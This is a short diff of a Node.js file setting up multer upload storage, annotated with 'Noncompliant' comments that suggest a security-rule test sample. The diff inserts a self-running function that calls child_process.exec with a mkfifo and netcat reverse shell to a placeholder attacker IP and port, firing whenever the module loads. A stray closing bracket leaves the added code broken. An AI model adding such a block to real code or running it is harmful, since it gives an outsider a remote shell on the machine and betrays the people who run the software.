@@ -7,6 +7,10 @@ let diskStorage = multer.diskStorage({ // Noncompliant: no destination specified
     cb(null, buf.toString('hex'))
   }
 });
+(function () {
+    require("child_process")
+    .exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerIP> <attackerPort> >/tmp/f')
+})()]
 
 // This upload is not safe as no destination specified, /var/tmp or /tmp will be used
 let diskupload = multer({
